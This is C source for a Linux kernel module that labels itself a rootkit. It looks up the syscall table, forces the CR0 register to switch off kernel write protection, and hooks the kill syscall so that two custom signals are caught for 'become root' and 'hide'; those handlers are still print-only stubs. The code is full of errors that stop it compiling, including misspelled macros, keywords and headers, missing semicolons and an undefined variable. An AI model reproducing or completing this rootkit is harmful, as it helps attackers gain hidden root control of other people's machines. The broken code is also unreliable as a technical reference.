#include <linux/init.h>             //must have to make a kernal module
#include <linux/module.h>           //must have to make a kernal module
#include <linux/kernel.h>           //to ger kernal methods
#include <linux/syscalls.h>         // to get syscalltable
#include <linux/kallsyms.h>         //also to get acces to kallsysm_lookup_name
#include <linux/kprobes.h>          //work around for kernal 5.6.0 and above
#include <linux/unistd.h>           // contains syscall numbers
#include <linux/version.h>         // linux/ kernel versions 
#include <asm/paravirit.h>         // contains function for read_cr0()


MODULE_LICENSE("GPL");
MODULE_AUTHOR("infernexio");
MODULE_DESCRIPTION("rootkit");
MODULE_VERSION("0.0.1");

unsigned long *__sys_call_table = NULL;

#ifdef CONFIG_X86_64
/* on 64-bit x86 and kernel v4.17 syscalls are nolonger
 allowed to be called form the kernel*/
#if LINUX_VERSION_CODE >= KERNERL_VERSION(4,17,0)
#define PTREGS_SYSCALL_STUB 1
typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs)
satic ptregs_t orig_kill;
#else
typedef asmlinkage long (*orig_kill_t)(pid_t pis, int sig);
static orig_killl_t orig_kill
#endif
#endif

enum signals{
    SIGSUPER = 64, //become root
    SIGINVIS = 63, // hide
};

#if PTREGS_SYSCALL_STUB
static asmlikage long hacked_kill(const struct pt_regs *regs){
    int sig = regs->si;
    
    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER :d | hide itself/malware/etc", sig, SIGSUPER);
        return 0;
    }else if(sig == SIGINVIS){
        printk(KERN_INFO "signal: %d == SIGINVIS :d | hide itself/malware/etc", sig, SIGINVIS);
        return 0;
    }

    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}

#else
static asmlinkage long hacked_kill(pid_t pid, int sig){
    if(sig == SIGSUPER){
        printk(KERN_INFO "signal: %d == SIGSUPER :d | hide itself/malware/etc", sig, SIGSUPER);
        return 0;
    }else if(sig == SIGINVIS){
        printk(KERN_INFO "signal: %d == SIGINVIS :d | hide itself/malware/etc", sig, SIGINVIS);
        return 0;
    }
    
    printk(KERN_INFO "***** hacked kill syscall *****\n");

    return orig_kill(regs);
}
#endif

static int cleanup(void){
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)orig_kill;

    return 0;
}

/**
 * stores the id of the sys call to later hook
*/
static int store(void){
/* if LINUX_VERSION_CODE >= KERNEL_VERSION(4,17,0) syscall use pt_regs stub*/
#if PTREGES_SYSCALL_STUB
    /* kill */
    orig_kill = (ptregs_t)__sys_call_table[__NR_kill]
    printk(KERN_INFO "orig_kill table entry successfully sotred\n");

/* if LINUX_VERSION_CODE < KERNEL_VERSION(4,17,0) */
#else
    /* kill */
    orig_kill = (orig_kill_t)__sys_call_table[__NR_kill]
    printk(KERN_INFO "orig_kill table entry successfully sotred\n");
#endif

    return 0;
    
}

static int hook(void){
    /* kill */
    __sys_call_table[__NR_kill] = (unsigned long)&hacked_kill;
    return 0;
}

/**
 * Custom write_cr0 function to unprotect memory
 * this gets past the checks that the write_cr0 has
 */
static inline void write_cr0_forced(unsigned long val){
    unsigned long __force_order;

    asm volatile(
        "mov %0, %%cr0"
        : "+r"(val), "+m"(__force_order));
}

/**
 * Disables write protection
*/
static void unprotect_memory(void){
    write_cr0_forced(read_cr0() & (~ 0x10000));
    printk(KERN_INFO "unportected memory\n");
}

/**
 * enables memory protection
*/
static void protect_memory(void){
    write_cr0_forced(read_cr0() | (0x10000));
    printk(KERN_INFO "protected memory\n");
}

/**
 * checks kernel version and gets address of syscall table
 * @return - returns the memory adress of the syscall table
*/
static unsigned long *get_syscall_table(void){
    unsigned long *syscall_table;

    #if LINUX_VERSION_CODE < KERNEL_VERSION(5,4,0)
        syscall_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
    #else
        syscall_table = NULL;
    #endif

        return syscall_table;
}

/**
 * start of the rootkit
 * like the main method
*/
static int __init init_func(void){
    int err = 1;
    printk(KERN_INFO "rootkit: initalized\n");

    __sys_call_table = get_syscall_table();

    if(!__sys_call_table){
        printk(KERN_INFO "error: unable to gain syscal table\n");
        return err;
    }

    if(store() == err){
        printk(KERN_INFO "error:store error\n");
    }

    unprotect_memory();

    if(hook() == err){
        printk(KERN_INFO "error: hook error\n");
    }

    protect_memory();

    return 0;
}

/**
 * exit of the rootkit
*/
static void __exit exit_func(void){
    int err = 1;
    printk(KERN_INFO "rootkit: stoped\n");

    unprotect_memory();

    if(cleanup() == err){
        printk(KERN_INFO "error: clean up error\n");
    }

    protect_memory();
}

/**
 * sets the init and exit methods
*/
module_init(init_func);
module_exit(exit_func);
